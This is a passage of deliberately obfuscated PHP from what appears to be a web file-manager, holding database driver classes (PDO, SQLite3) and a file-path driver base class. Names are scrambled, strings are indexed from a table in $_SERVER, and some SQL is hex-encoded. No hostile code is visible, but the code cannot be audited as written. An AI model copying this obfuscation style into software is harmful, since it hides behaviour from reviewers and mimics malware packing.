str_replace($‚Ó¥ˆ‹ƒ[975], $€Ãõ–æç, think_config($‚Ó¥ˆ‹ƒ[974])); } else { switch ($this->dbType) { case $‚Ó¥ˆ‹ƒ[958]: case $‚Ó¥ˆ‹ƒ[976]: $¿Ü¿ƒ’ = "\123\x45\114\x45\103\124\40\40\x20\143\x6f\154\x75\x6d\x6e\137\x6e\x61\155\145\40\141\x73\40\47\x4e\x61\155\145\47\54\x20\x20\x20\144\x61\164\141\x5f\x74\171\x70\x65\40\x61\x73\40\47\x54\x79\x70\x65\47\54\40\40\x20\143\x6f\154\x75\155\x6e\137\144\145\146\141\x75\154\x74\40\141\x73\40\x27\x44\145\146\x61\165\x6c\164\x27\x2c\x20\40\40\151\x73\x5f\x6e\x75\x6c\154\x61\x62\154\x65\40\141\x73\40\x27\116\165\x6c\x6c\47\xa\x9\11\106\x52\x4f\x4d\11\151\x6e\x66\x6f\162\155\x61\x74\x69\x6f\156\x5f\x73\x63\x68\145\155\141\x2e\164\x61\x62\x6c\145\163\40\101\x53\40\164\xa\x9\x9\112\x4f\x49\x4e\11\x69\156\x66\x6f\x72\155\141\x74\x69\x6f\156\x5f\x73\x63\x68\145\x6d\141\x2e\x63\157\154\165\x6d\156\x73\40\101\123\x20\143\12\x9\11\117\116\40\40\164\56\164\x61\x62\154\145\x5f\x63\141\164\x61\154\157\x67\40\75\x20\143\56\164\x61\x62\x6c\x65\137\143\141\164\x61\x6c\157\147\xa\x9\x9\101\116\x44\40\x74\x2e\164\x61\142\x6c\x65\x5f\163\x63\x68\145\155\x61\x20\75\40\143\x2e\x74\x61\x62\154\145\137\163\143\150\x65\x6d\x61\xa\11\11\x41\x4e\x44\x20\164\56\x74\x61\x62\x6c\x65\x5f\156\x61\x6d\x65\x20\75\x20\x63\56\x74\141\x62\154\145\137\156\x61\155\145\xa\x9\x9\127\x48\x45\122\x45\40\x20\40\x74\56\164\x61\x62\x6c\145\137\156\x61\x6d\145\x20\x3d\x20\x27{$€Ãõ–æç}\x27"; break; case $‚Ó¥ˆ‹ƒ[977]: $¿Ü¿ƒ’ = $‚Ó¥ˆ‹ƒ[978] . $€Ãõ–æç . $‚Ó¥ˆ‹ƒ[979]; break; case $‚Ó¥ˆ‹ƒ[959]: case $‚Ó¥ˆ‹ƒ[961]: $¿Ü¿ƒ’ = $‚Ó¥ˆ‹ƒ[980] . $‚Ó¥ˆ‹ƒ[981] . $‚Ó¥ˆ‹ƒ[982] . strtoupper($€Ãõ–æç) . $‚Ó¥ˆ‹ƒ[983] . strtoupper($€Ãõ–æç) . $‚Ó¥ˆ‹ƒ[984]; break; case $‚Ó¥ˆ‹ƒ[985]: $¿Ü¿ƒ’ = $‚Ó¥ˆ‹ƒ[986] . $€Ãõ–æç . $‚Ó¥ˆ‹ƒ[987]; break; case $‚Ó¥ˆ‹ƒ[960]: break; case $‚Ó¥ˆ‹ƒ[988]: default: $¿Ü¿ƒ’ = $‚Ó¥ˆ‹ƒ[989] . ($this->dbType == $‚Ó¥ˆ‹ƒ[988] ? "\x60{$€Ãõ–æç}\140" : $€Ãõ–æç); } } $íĞ±öÆ¬ = $this->query($¿Ü¿ƒ’); $è²¶Õè = array(); if ($íĞ±öÆ¬) { foreach ($íĞ±öÆ¬ as $ØÓØøÆÙ => $¨ÜÔ«Æ½) { $¨ÜÔ«Æ½ = array_change_key_case($¨ÜÔ«Æ½); $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[42]] = isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[42]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[42]] : $‚Ó¥ˆ‹ƒ[431]; $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[43]] = isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[43]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[43]] : $‚Ó¥ˆ‹ƒ[431]; $íŞÕ¡¹ü = isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[326]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[326]] : $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[42]]; $è²¶Õè[$íŞÕ¡¹ü] = array($‚Ó¥ˆ‹ƒ[42] => $íŞÕ¡¹ü, $‚Ó¥ˆ‹ƒ[43] => $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[43]], $‚Ó¥ˆ‹ƒ[45] => (bool) (isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[113]]) && $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[113]] === $‚Ó¥ˆ‹ƒ[22] || isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[45]]) && $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[45]] === $‚Ó¥ˆ‹ƒ[22]), $‚Ó¥ˆ‹ƒ[47] => isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[47]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[47]] : (isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[66]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[66]] : $‚Ó¥ˆ‹ƒ[431]), $‚Ó¥ˆ‹ƒ[49] => isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[104]]) ? strtolower($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[104]]) == $‚Ó¥ˆ‹ƒ[51] : (isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[67]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[67]] : !1), $‚Ó¥ˆ‹ƒ[52] => isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[990]]) ? strtolower($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[990]]) == $‚Ó¥ˆ‹ƒ[54] : (isset($¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[104]]) ? $¨ÜÔ«Æ½[$‚Ó¥ˆ‹ƒ[104]] : !1)); } } return $è²¶Õè; } public function getTables($®Û¼êµ” = '') { $¬–‚æú =& $_SERVER[ú÷îèÆÜ]; if (think_config($¬–‚æú[991])) { $©Â–Ö‘Ö = str_replace($¬–‚æú[992], $®Û¼êµ”, think_config($¬–‚æú[991])); } else { switch ($this->dbType) { case $¬–‚æú[959]: case $¬–‚æú[961]: $©Â–Ö‘Ö = $¬–‚æú[993]; break; case $¬–‚æú[958]: case $¬–‚æú[976]: $©Â–Ö‘Ö = $¬–‚æú[994]; break; case $¬–‚æú[985]: $©Â–Ö‘Ö = $¬–‚æú[995]; break; case $¬–‚æú[960]: think_exception(think_lang($¬–‚æú[996]) . $¬–‚æú[997]); break; case $¬–‚æú[977]: $©Â–Ö‘Ö = $¬–‚æú[55] . $¬–‚æú[56] . $¬–‚æú[57]; break; case $¬–‚æú[988]: default: if (!empty($®Û¼êµ”)) { $©Â–Ö‘Ö = $¬–‚æú[940] . $®Û¼êµ” . $¬–‚æú[941]; } else { $©Â–Ö‘Ö = $¬–‚æú[942]; } } } $•¢¼òÙ¯ = $this->query($©Â–Ö‘Ö); $òë¨™äÒ = array(); foreach ($•¢¼òÙ¯ as $æ‹”«Ù => $·°Äá–‰) { $òë¨™äÒ[$æ‹”«Ù] = current($·°Äá–‰); } return $òë¨™äÒ; } protected function parseLimit($“‘“Ä·) { $…¿Î‡³Ã =& $_SERVER[ú÷îèÆÜ]; $±¹Ó·ıâ = $…¿Î‡³Ã[22]; if (!empty($“‘“Ä·)) { switch ($this->dbType) { case $…¿Î‡³Ã[985]: case $…¿Î‡³Ã[977]: $“‘“Ä· = explode($…¿Î‡³Ã[60], $“‘“Ä·); if (count($“‘“Ä·) > 1) { $±¹Ó·ıâ .= $…¿Î‡³Ã[61] . $“‘“Ä·[1] . $…¿Î‡³Ã[62] . $“‘“Ä·[0] . $…¿Î‡³Ã[63]; } else { $±¹Ó·ıâ .= $…¿Î‡³Ã[61] . $“‘“Ä·[0] . $…¿Î‡³Ã[63]; } break; case $…¿Î‡³Ã[958]: case $…¿Î‡³Ã[976]: break; case $…¿Î‡³Ã[960]: break; case $…¿Î‡³Ã[959]: case $…¿Î‡³Ã[961]: break; case $…¿Î‡³Ã[988]: default: $±¹Ó·ıâ .= $…¿Î‡³Ã[61] . $“‘“Ä· . $…¿Î‡³Ã[63]; } } return $±¹Ó·ıâ; } public function parseKey(&$”–ÍÌ†µ, $âØ‘– = true) { $¡ıàÀü­ =& $_SERVER[ú÷îèÆÜ]; if ($âØ‘–) { $”–ÍÌ†µ = $this->parseKeyCheck($”–ÍÌ†µ); } if ($this->dbType == $¡ıàÀü­[988]) { if ($”–ÍÌ†µ != $¡ıàÀü­[213] && !preg_match($¡ıàÀü­[952], $”–ÍÌ†µ)) { $”–ÍÌ†µ = $¡ıàÀü­[438] . trim($”–ÍÌ†µ, $¡ıàÀü­[438]) . $¡ıàÀü­[438]; } return $”–ÍÌ†µ; } else { return parent::parseKey($”–ÍÌ†µ, $âØ‘–); } } public function close() { $this->_linkID = null; } public function error() { $°—Ë²ÏÓ =& $_SERVER[ú÷îèÆÜ]; if ($this->PDOStatement) { $ı­ñ•™â = $this->PDOStatement->errorInfo(); $this->error = $ı­ñ•™â[1] . $°—Ë²ÏÓ[4] . $ı­ñ•™â[2]; } else { $this->error = $°—Ë²ÏÓ[22]; } if ($°—Ë²ÏÓ[22] != $this->queryStr) { $this->error .= LNG($°—Ë²ÏÓ[58]) . $this->queryStr; } think_trace($this->error, $°—Ë²ÏÓ[22], $°—Ë²ÏÓ[59]); return $this->error; } public function escapeString($«ùÂÅœ¨) { $Å­ƒ´Ø =& $_SERVER[ú÷îèÆÜ]; switch ($this->dbType) { case $Å­ƒ´Ø[985]: case $Å­ƒ´Ø[958]: case $Å­ƒ´Ø[976]: case $Å­ƒ´Ø[988]: return addslashes($«ùÂÅœ¨); case $Å­ƒ´Ø[960]: case $Å­ƒ´Ø[977]: case $Å­ƒ´Ø[959]: case $Å­ƒ´Ø[961]: return str_ireplace($Å­ƒ´Ø[68], $Å­ƒ´Ø[69], $«ùÂÅœ¨); } } protected function parseValue($¼×»‡úÆ) { $³÷Ô°ˆæ =& $_SERVER[ú÷îèÆÜ]; if (is_string($¼×»‡úÆ)) { $±–õèòª = strpos($¼×»‡úÆ, $³÷Ô°ˆæ[4]) === 0 && in_array($¼×»‡úÆ, array_keys($this->bind)); $¼×»‡úÆ = $±–õèòª ? $this->escapeString($¼×»‡úÆ) : $³÷Ô°ˆæ[998] . $this->escapeString($¼×»‡úÆ) . $³÷Ô°ˆæ[998]; } elseif (isset($¼×»‡úÆ[0]) && is_string($¼×»‡úÆ[0]) && strtolower($¼×»‡úÆ[0]) == $³÷Ô°ˆæ[350]) { $¼×»‡úÆ = $this->escapeString($¼×»‡úÆ[1]); } elseif (is_array($¼×»‡úÆ)) { $¼×»‡úÆ = array_map(array($this, $³÷Ô°ˆæ[999]), $¼×»‡úÆ); } elseif (is_bool($¼×»‡úÆ)) { $¼×»‡úÆ = $¼×»‡úÆ ? $³÷Ô°ˆæ[98] : $³÷Ô°ˆæ[222]; } elseif (is_null($¼×»‡úÆ)) { $¼×»‡úÆ = $³÷Ô°ˆæ[113]; } return $¼×»‡úÆ; } public function getLastInsertId() { $³ğ‹¯Àî =& $_SERVER[ú÷îèÆÜ]; switch ($this->dbType) { case $³ğ‹¯Àî[985]: case $³ğ‹¯Àî[977]: case $³ğ‹¯Àî[958]: case $³ğ‹¯Àî[976]: case $³ğ‹¯Àî[960]: case $³ğ‹¯Àî[988]: return $this->_linkID->lastInsertId(); case $³ğ‹¯Àî[959]: case $³ğ‹¯Àî[961]: $÷º¬·ÇÎ = $this->table; $¤Œæ…— = $this->query("\x53\x45\114\x45\103\124\x20{$÷º¬·ÇÎ}\x2e\x63\x75\x72\x72\x76\x61\154\x20\x63\x75\162\x72\x76\141\154\x20\106\122\x4f\x4d\40\144\165\x61\154"); return $¤Œæ…— ? $¤Œæ…—[0][$³ğ‹¯Àî[1000]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ôôÚŸÎ) { $ÈÌ×õÃö =& $_SERVER[ú÷îèÆÜ]; if (!CacheLock::fileLock($ÈÌ×õÃö[23])) { return !1; } $øˆ¿Õª“ = parent::query($ôôÚŸÎ); CacheLock::fileUnLock($ÈÌ×õÃö[23]); return $øˆ¿Õª“; } public function execute($”ÏŠÆ£š) { $¤®Êùø =& $_SERVER[ú÷îèÆÜ]; if (!CacheLock::fileLock($¤®Êùø[23])) { return !1; } $Ã¡Ãù¨ı = parent::execute($”ÏŠÆ£š); CacheLock::fileUnLock($¤®Êùø[23]); return $Ã¡Ãù¨ı; } } goto dòÍ‚­õ”â; B™±Åó±‘§: class DbSqlite3Base extends Db { public function __construct($±İıŒ®Ì = '') { $ì˜¼åû× =& $_SERVER[ú÷îèÆÜ]; if (!class_exists($ì˜¼åû×[64])) { think_exception(think_lang($ì˜¼åû×[24]) . $ì˜¼åû×[65]); } if (!empty($±İıŒ®Ì)) { if (!isset($±İıŒ®Ì[$ì˜¼åû×[26]])) { $±İıŒ®Ì[$ì˜¼åû×[26]] = 438; } $this->config = $±İıŒ®Ì; if (empty($this->config[$ì˜¼åû×[27]])) { $this->config[$ì˜¼åû×[27]] = array(); } } } public function connect($²ğÄò³ = '', $¢·Ãµë˜ = 0) { $Ò…Ğéú =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->linkID[$¢·Ãµë˜])) { if (empty($²ğÄò³)) { $²ğÄò³ = $this->config; } $this->linkID[$¢·Ãµë˜] = new SQLite3($²ğÄò³[$Ò…Ğéú[31]]); if (!$this->linkID[$¢·Ãµë˜]) { think_exception($this->linkID[$¢·Ãµë˜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¢·Ãµë˜]->busyTimeout(30000); if (1 != think_config($Ò…Ğéú[32])) { unset($this->config); } } return $this->linkID[$¢·Ãµë˜]; } public function free() { $this->queryID = null; } public function query($ã¾ÅšîÕ) { $¬Û—•°Œ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã¾ÅšîÕ; if ($this->queryID) { $this->free(); } think_action_status($¬Û—•°Œ[33], 1); think_status($¬Û—•°Œ[34]); $this->queryID = $this->_linkID->query($ã¾ÅšîÕ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ŸÜ§¥ÈÕ = $this->getAll(); $this->numRows = count($ŸÜ§¥ÈÕ); return $ŸÜ§¥ÈÕ; } } public function execute($™ìƒĞõ—) { $˜Ğù×ê¯ =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $™ìƒĞõ—; if ($this->queryID) { $this->free(); } think_action_status($˜Ğù×ê¯[35], 1); think_status($˜Ğù×ê¯[34]); $­»§î â = $this->_linkID->exec($™ìƒĞõ—); $this->debug(); if (!1 === $­»§î â) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ú÷îèÆÜ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Í½›Œî = $this->_linkID->query($_SERVER[ú÷îèÆÜ][37]); if (!$Í½›Œî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $…˜ƒş˜” = $this->_linkID->query($_SERVER[ú÷îèÆÜ][38]); if (!$…˜ƒş˜”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‹åáÇÖî = array(); while ($¬Íò¯ñ¤ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $‹åáÇÖî[] = $¬Íò¯ñ¤; } $this->queryID->reset(); return $‹åáÇÖî; } public function getFields($Œ—õª™£) { $Ö¦¿‰˜à =& $_SERVER[ú÷îèÆÜ]; $ÔşöÄ²Ë = $this->query($Ö¦¿‰˜à[39] . $Œ—õª™£ . $Ö¦¿‰˜à[40]); $¤”†œĞÄ = array(); if ($ÔşöÄ²Ë) { foreach ($ÔşöÄ²Ë as $ÈÌĞ²Àâ => $üÆÆ‹óå) { $¤”†œĞÄ[$üÆÆ‹óå[$Ö¦¿‰˜à[42]]] = array($Ö¦¿‰˜à[42] => $üÆÆ‹óå[$Ö¦¿‰˜à[42]], $Ö¦¿‰˜à[43] => $üÆÆ‹óå[$Ö¦¿‰˜à[43]], $Ö¦¿‰˜à[45] => (bool) ($üÆÆ‹óå[$Ö¦¿‰˜à[45]] === $Ö¦¿‰˜à[22]), $Ö¦¿‰˜à[47] => $üÆÆ‹óå[$Ö¦¿‰˜à[66]], $Ö¦¿‰˜à[49] => (bool) $üÆÆ‹óå[$Ö¦¿‰˜à[67]], $Ö¦¿‰˜à[52] => (bool) $üÆÆ‹óå[$Ö¦¿‰˜à[67]]); } } return $¤”†œĞÄ; } public function getTables($ğ÷´ò€‰ = '') { $¿§¹ó›Ô =& $_SERVER[ú÷îèÆÜ]; $ÌÄ¼¼ÆÔ = $this->query($¿§¹ó›Ô[55] . $¿§¹ó›Ô[56] . $¿§¹ó›Ô[57]); $Æˆ“Üİ = array(); foreach ($ÌÄ¼¼ÆÔ as $Ú¸ò´Œ => $ŸÉ¢úÔÄ) { $Æˆ“Üİ[$Ú¸ò´Œ] = current($ŸÉ¢úÔÄ); } return $Æˆ“Üİ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ú¼³îâÇ =& $_SERVER[ú÷îèÆÜ]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ú¼³îâÇ[22] != $this->queryStr) { $this->error .= LNG($Ú¼³îâÇ[58]) . $this->queryStr; } think_trace($this->error, $Ú¼³îâÇ[22], $Ú¼³îâÇ[59]); return $this->error; } public function escapeString($ˆõüí£È) { $ºƒÀš¥Ò =& $_SERVER[ú÷îèÆÜ]; if ($this->_linkID) { return $this->_linkID->escapeString($ˆõüí£È); } return str_ireplace($ºƒÀš¥Ò[68], $ºƒÀš¥Ò[69], $ˆõüí£È); } public function parseLimit($³ÑÀµö©) { $˜œÖ«÷à =& $_SERVER[ú÷îèÆÜ]; $¡ÈûÈı˜ = $˜œÖ«÷à[22]; if (!empty($³ÑÀµö©)) { $³ÑÀµö© = explode($˜œÖ«÷à[60], $³ÑÀµö©); if (count($³ÑÀµö©) > 1) { $¡ÈûÈı˜ .= $˜œÖ«÷à[61] . $³ÑÀµö©[1] . $˜œÖ«÷à[62] . $³ÑÀµö©[0] . $˜œÖ«÷à[63]; } else { $¡ÈûÈı˜ .= $˜œÖ«÷à[61] . $³ÑÀµö©[0] . $˜œÖ«÷à[63]; } } return $¡ÈûÈı˜; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $áÔ©øèĞ =& $_SERVER[ú÷îèÆÜ]; $this->objectDriver = array($áÔ©øèĞ[70], $áÔ©øèĞ[71], $áÔ©øèĞ[72], $áÔ©øèĞ[73], $áÔ©øèĞ[74], $áÔ©øèĞ[75], $áÔ©øèĞ[76], $áÔ©øèĞ[77], $áÔ©øèĞ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ûëàÃ‘) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ûëàÃ‘, $_SERVER[ú÷îèÆÜ][18]); } return $ûëàÃ‘; } public function iconvApp($ê³§†¹ô) { return $ê³§†¹ô; } public function iconvSystem($çö‚Çã) { return $çö‚Çã; } public function iconvTo($šƒÌ—ë‚, $›ü“ä‰Î, $ÍŒ¹ƒËó) { $‰¢Èóãù =& $_SERVER[ú÷îèÆÜ]; if (!$šƒÌ—ë‚ || !function_exists($‰¢Èóãù[79])) { return $šƒÌ—ë‚; } static $ÑŠœÜ¨â = array(); $ïå§Éø = $›ü“ä‰Î . $‰¢Èóãù[80] . $ÍŒ¹ƒËó . $‰¢Èóãù[81] . $šƒÌ—ë‚; if (isset($ÑŠœÜ¨â[$ïå§Éø])) { return $ÑŠœÜ¨â[$ïå§Éø]; } if (function_exists($‰¢Èóãù[82])) { $Ñ«¬¾˜Å = @mb_convert_encoding($šƒÌ—ë‚, $ÍŒ¹ƒËó, $›ü“ä‰Î); } else { $Ñ«¬¾˜Å = @iconv($›ü“ä‰Î, $ÍŒ¹ƒËó, $šƒÌ—ë‚); } $Ñ«¬¾˜Å = $Ñ«¬¾˜Å ? $Ñ«¬¾˜Å : $šƒÌ—ë‚; if (strstr($Ñ«¬¾˜Å, $‰¢Èóãù[83])) { $Ñ«¬¾˜Å = str_replace($‰¢Èóãù[83], $‰¢Èóãù[21], $Ñ«¬¾˜Å); } $ÑŠœÜ¨â[$›ü“ä‰Î . $‰¢Èóãù[80] . $ÍŒ¹ƒËó . $‰¢Èóãù[81] . $šƒÌ—ë‚] = $Ñ«¬¾˜Å; $ÑŠœÜ¨â[$ÍŒ¹ƒËó . $‰¢Èóãù[80] . $›ü“ä‰Î . $‰¢Èóãù[81] . $šƒÌ—ë‚] = $šƒÌ—ë‚; $ÑŠœÜ¨â[$ÍŒ¹ƒËó . $‰¢Èóãù[80] . $›ü“ä‰Î . $‰¢Èóãù[81] . $Ñ«¬¾˜Å] = $šƒÌ—ë‚; $ÑŠœÜ¨â[$›ü“ä‰Î . $‰¢Èóãù[80] . $ÍŒ¹ƒËó . $‰¢Èóãù[81] . $Ñ«¬¾˜Å] = $Ñ«¬¾˜Å; return $Ñ«¬¾˜Å; } public function getPathInner($ã”¦Üæ”) { $íÈÔ‡€¾ = IO::init($ã”¦Üæ”); return $íÈÔ‡€¾->path; } public function getPathOuter($íŸä¢°Ë) { $ù¿×‰‘± =& $_SERVER[ú÷îèÆÜ]; $ÊÜÜÈíƒ = strlen(trim($this->pathBase, $ù¿×‰‘±[18])); $íŸä¢°Ë = substr(trim($íŸä¢°Ë, $ù¿×‰‘±[18]), $ÊÜÜÈíƒ); return $this->pathDriver . $ù¿×‰‘±[18] . ltrim($íŸä¢°Ë, $ù¿×‰‘±[18]); } public function isParentOf($ç©ØÄ–€, $­‘ÌıÕ¯) { $¹Šªãæ =& $_SERVER[ú÷îèÆÜ]; $ç©ØÄ–€ = rtrim(strtolower($ç©ØÄ–€), $¹Šªãæ[18]) . $¹Šªãæ[18]; $­‘ÌıÕ¯ = rtrim(strtolower($­‘ÌıÕ¯), $¹Šªãæ[18]) . $¹Šªãæ[18]; $×ä§ä = strpos($­‘ÌıÕ¯, $ç©ØÄ–€) === 0; return $×ä§ä; } public function getType() { $Ñì‘Äòš =& $_SERVER[ú÷îèÆÜ]; $ƒ¿–Âé = str_replace($Ñì‘Äòš[84], $Ñì‘Äòš[22], get_class($this)); return strtolower($ƒ¿–Âé); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÆôãìèŞ, $Ú¬²¨î) { $Êß™ïÖ¾ =& $_SERVER[ú÷îèÆÜ]; $ûÈäçµù = rtrim($ÆôãìèŞ, $Êß™ïÖ¾[18]) . $Êß™ïÖ¾[18] . $Ú¬²¨î; $úœÅ× = $this->exist($ûÈäçµù); return $úœÅ× ? $ûÈäçµù : !1; } public function setModifyTime($ü´ºÅâò, $Ñ´Ø×Å = '') { } public function renameObject($³›Èù×Ÿ, $€£Œ‡¦©) { $ÚğÑˆ­ö = $€£Œ‡¦©; $³›Èù×Ÿ = $this->getPathOuter($³›Èù×Ÿ); $€£Œ‡¦© = $this->pathFather($³›Èù×Ÿ) . $€£Œ‡¦©; $·Û…âÏÉ = IO::copy($³›Èù×Ÿ, $this->pathFather($³›Èù×Ÿ), REPEAT_RENAME_FOLDER, $ÚğÑˆ­ö); if ($·Û…âÏÉ) { IO::remove($³›Èù×Ÿ); } return $·Û…âÏÉ ? $€£Œ‡¦© : !1; } public function tempFile($¡«Ÿ¤Š = '', $ªŠ“ÅôÉ = '') { if (!$¡«Ÿ¤Š) { $¡«Ÿ¤Š = rand_string(15); } $™¯öèÕ® = TEMP_FILES . rand_string(15) . $_SERVER[ú÷îèÆÜ][18]; @mkdir($™¯öèÕ®, DEFAULT_PERRMISSIONS, !0); $œ–çùêº = $™¯öèÕ® . $¡«Ÿ¤Š; @touch($œ–çùêº); if ($ªŠ“ÅôÉ) { file_put_contents($œ–çùêº, $ªŠ“ÅôÉ); } return $œ–çùêº; } public function tempFileRemve($Ÿ±Æâ£) { @unlink($Ÿ±Æâ£); @rmdir($this->pathFather($Ÿ±Æâ£)); } public function mkfile($Ñ™ÌÒÇ‹, $©ÛÇ¾‘ğ = '', $ñ‡”Úè = REPEAT_RENAME) { } public function mkdir($ì°ä£Ğù, $¶¿Æ é = REPEAT_SKIP) { } public function delFile($ƒÂ°®øÇ) { } public function delFolder($ü¯‚šÓÆ) { } public function copyFile($¢¢—î, $ƒŸÂ‰¬¾) { } public function moveFile($Æ©ÈÄ¿, $Ñ•ù¶’) { } public function remove($„Ô£è…İ) { if ($this->isFile($„Ô£è…İ)) { return $this->delFile($„Ô£è…İ); } return $this->delFolder($„Ô£è…İ); } public function rename($À‰“°¯, $à«„§¯Ä) { } public function exist($¬ œáËİ) { } public function findByHash($æÀá ³ë = '', $À”®øÈ» = '') { return !1; } public function isFile($Ä¨ÃÔÆü) { } public function isFolder($ÎÀ´À Æ) { } public function size($Ö”…–€©) { } public function info($é´¨–‹²) { } public function infoSimple($ÔËÉ‘¡£) { return $this->info($ÔËÉ‘¡£); } public function infoAuth($ø³¿Šœí) { return $this->info($ø³¿Šœí); } public function infoFull($Ûß¯†ó) { return $this->info($Ûß¯†ó); } public function infoFullSimple($šû¥ºö”) { return $this->info($šû¥ºö”); } public function infoWithChildren($÷§Ø²İ) { $üƒ¡Ğ€ƒ =& $_SERVER[ú÷îèÆÜ]; static $ß²¤Ã½œ = array(); if (isset($ß²¤Ã½œ[$÷§Ø²İ])) { return $ß²¤Ã½œ[$÷§Ø²İ]; } $È¾Íœ˜İ = $this->info($÷§Ø²İ); if ($È¾Íœ˜İ && $È¾Íœ˜İ[$üƒ¡Ğ€ƒ[43]] == $üƒ¡Ğ€ƒ[85]) { $Ó‘èºÚì = array($üƒ¡Ğ€ƒ[86] => 0, $üƒ¡Ğ€ƒ[87] => 0, $üƒ¡Ğ€ƒ[88] => 0); $this->infoChildren($÷§Ø²İ, $Ó‘èºÚì); $È¾Íœ˜İ[$üƒ¡Ğ€ƒ[86]] = $Ó‘èºÚì[$üƒ¡Ğ€ƒ[86]]; $È¾Íœ˜İ[$üƒ¡Ğ€ƒ[89]] = array($üƒ¡Ğ€ƒ[90] => $Ó‘èºÚì[$üƒ¡Ğ€ƒ[87]], $üƒ¡Ğ€ƒ[91] => $Ó‘èºÚì[$üƒ¡Ğ€ƒ[88]]); $ß²¤Ã½œ[$÷§Ø²İ] = $È¾Íœ˜İ; } return $È¾Íœ˜İ; } public function listPath($ğñÔ†íó, $© ²ı®Ì = false) { } public function has($ôš°òş, $œÁ½“’ = false, $È³–Ñäé = false) { } public function canRead($Ş÷´ÁŞû) { } public function canWrite($¶Ï“°ŸÅ) { } public function getContent($ÍÁ„ìŸ³) { } public function setContent($Şöê¸º, $’šºó‡Ï = '') { } protected function infoChildren($½¹±Â¨ê, &$ø‡¹†íÌ) { $ëŸ§Œ×† =& $_SERVER[ú÷îèÆÜ]; check_abort_echo(); $İÍ¼ôæ‰ = $this->listPath($½¹±Â¨ê, !0); $İÍ¼ôæ‰ = array_merge($İÍ¼ôæ‰[$ëŸ§Œ×†[92]], $İÍ¼ôæ‰[$ëŸ§Œ×†[93]]); foreach ($İÍ¼ôæ‰ as $—ºİŠ¡Ï) { if ($—ºİŠ¡Ï[$ëŸ§Œ×†[43]] == $ëŸ§Œ×†[85]) { $ø‡¹†íÌ[$ëŸ§Œ×†[88]]++; $°íë‹ÇÈ = $this->getPathInner($—ºİŠ¡Ï[$ëŸ§Œ×†[94]]); $this->infoChildren($°íë‹ÇÈ, $ø‡¹†íÌ); } else { $ø‡¹†íÌ[$ëŸ§Œ×†[87]]++; $ø‡¹†íÌ[$ëŸ§Œ×†[86]] += $—ºİŠ¡Ï[$ëŸ§Œ×†[86]]; } } } public function fileSubstr($Ãó°½¸î, $¿İııõ, $£ª¶Šúæ) { } public function listAll($ŞçÓŠÚß) { } public function listAllMake($¶ÆÊ·İ“, &$’¬¬”„ı) { $·ß’á½­ =& $_SERVER[ú÷îèÆÜ]; check_abort_echo(); $õß›ÚÃ = $this->listPath($¶ÆÊ·İ“, !0); if (!$õß›ÚÃ) { return; } $¸Ò€ı§ó = array_merge($õß›ÚÃ[$·ß’á½­[92]], $õß›ÚÃ[$·ß’á½­[93]]); foreach ($¸Ò€ı§ó as $Å¶øÉñ—) { $£‹€Øœœ = $Å¶øÉñ—[$·ß’á½­[43]] == $·ß’á½­[85]; $àûµØÆ = array($·ß’á½­[94] => $Å¶øÉñ—[$·ß’á½­[94]], $·ß’á½­[85] => $£‹€Øœœ); if (isset($Å¶øÉñ—[$·ß’á½­[86]])) { $àûµØÆ[$·ß’á½­[86]] = $Å¶øÉñ—[$·ß’á½­[86]]; } if (isset($Å¶øÉñ—[$·ß’á½­[95]])) { $àûµØÆ[$·ß’á½­[95]] = $Å¶øÉñ—[$·ß’á½­[95]]; } if (!$£‹€Øœœ) { $’¬¬”„ı[] = $àûµØÆ; continue; } $’¬¬”„ı[] = $àûµØÆ; $´½íí¡ 